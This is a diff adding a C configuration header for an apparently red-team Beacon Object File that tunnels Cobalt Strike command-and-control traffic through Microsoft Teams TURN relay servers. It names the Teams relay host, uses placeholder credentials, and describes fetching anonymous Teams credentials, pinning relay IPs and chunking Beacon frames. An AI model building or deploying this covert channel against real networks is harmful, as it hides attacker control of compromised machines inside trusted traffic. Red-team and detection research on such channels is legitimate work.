@@ -1,0 +1,107 @@
+// bof_config.h — build-time configuration for the TURN UDC2 BOF.
+//
+// This is the template. `turn-udc2-server --emit-bof-config bof/bof_config.h`
+// overwrites bof_config.h with live values (credentials, the server's
+// relayed address and the pinned TURN server IP); the Makefile copies
+// this template into place when no generated file exists yet.
+//
+// NOTE: the emitted file must define everything the BOF sources consume.
+// When adding a tunable here, add it to writeBOFConfig in
+// cmd/turn-udc2-server/main.go as well.
+//
+// TURN_SERVER_HOST is the hostname used for TLS SNI and certificate
+// validation. TURN_SERVER_ADDR is what the BOF connects to: pinning
+// the IP (the emitted config does) guarantees the BOF uses the same TURN
+// server — and relay pool — as the operator server, regardless of the
+// target's geo-DNS view.
+#ifndef BOF_CONFIG_H
+#define BOF_CONFIG_H
+
+#ifndef TURN_SERVER_HOST
+#define TURN_SERVER_HOST "worldaz-msit.relay.teams.microsoft.com"
+#endif
+
+// Optional pinned TURN server IP. Leave as the hostname (or a non-IP
+// string) to resolve via DNS.
+#ifndef TURN_SERVER_ADDR
+#define TURN_SERVER_ADDR TURN_SERVER_HOST
+#endif
+
+#ifndef TURN_SERVER_PORT
+#define TURN_SERVER_PORT 443
+#endif
+
+// TURN long-term credentials (Teams trap-exp credentials).
+#ifndef TURN_USERNAME
+#define TURN_USERNAME "REPLACE_WITH_TURN_USERNAME"
+#endif
+
+#ifndef TURN_PASSWORD
+#define TURN_PASSWORD "REPLACE_WITH_TURN_PASSWORD"
+#endif
+
+// When the baked TURN credentials expire (Unix seconds). Emitted by
+// turn-udc2-server alongside the credentials; 0 = unknown, which makes
+// the BOF fetch fresh credentials on its first connect.
+#ifndef TURN_CRED_EXPIRES
+#define TURN_CRED_EXPIRES 0
+#endif
+
+// BOF-side credential refresh: once less than this many seconds remain
+// before expiry (or when expiry is unknown), and again whenever ALLOCATE
+// authentication keeps failing, the BOF fetches fresh anonymous TURN
+// credentials from teams.microsoft.com over HTTPS. Requires the target
+// to resolve/reach teams.microsoft.com:443 (the same domain family the
+// TURN connection itself uses).
+#ifndef TURN_CRED_REFRESH_MARGIN_S
+#define TURN_CRED_REFRESH_MARGIN_S 86400
+#endif
+
+// Assumed credential lifetime when Teams does not report one (fallback;
+// the observed lifetime is 7 days, so one day is safely conservative).
+#ifndef TURN_CRED_UNKNOWN_TTL_S
+#define TURN_CRED_UNKNOWN_TTL_S 86400
+#endif
+
+// The operator's relayed address(es): the UDC2 server's TURN relay.
+// This is the "offer" side of the TURN rendezvous; the "answer" (this
+// BOF's relayed address) is learned by the server from the first inbound
+// TURN message.
+#ifndef TURN_PEER_COUNT
+#define TURN_PEER_COUNT 1
+#endif
+
+#ifndef TURN_PEER_ADDRS
+#define TURN_PEER_ADDRS { "0.0.0.0:0" }
+#endif
+
+// Payload bytes per TURN message (server default matches). Keep small:
+// the relayed hop between allocations is a UDP datagram, and larger
+// messages get IP-fragmented (and dropped) in practice.
+#ifndef TURN_CHUNK_SIZE
+#define TURN_CHUNK_SIZE 1200
+#endif
+
+// Overall deadline for one udc2Proxy call (send + wait for response).
+#ifndef TURN_PROXY_TIMEOUT_MS
+#define TURN_PROXY_TIMEOUT_MS 60000
+#endif
+
+// Refresh allocation + permissions when idle longer than this (must stay
+// below the TURN permission lifetime of 300s and allocation lifetime).
+#ifndef TURN_KEEPALIVE_MS
+#define TURN_KEEPALIVE_MS 240000
+#endif
+
+// Socket I/O timeout used while waiting for TURN responses.
+#ifndef TURN_IO_TIMEOUT_MS
+#define TURN_IO_TIMEOUT_MS 5000
+#endif
+
+// Largest Beacon frame the BOF will reassemble (tasks_max_size default
+// is 1 MiB).
+#ifndef TURN_MAX_FRAME
+#define TURN_MAX_FRAME (1024 * 1024)
+#endif
+
+#endif // BOF_CONFIG_H
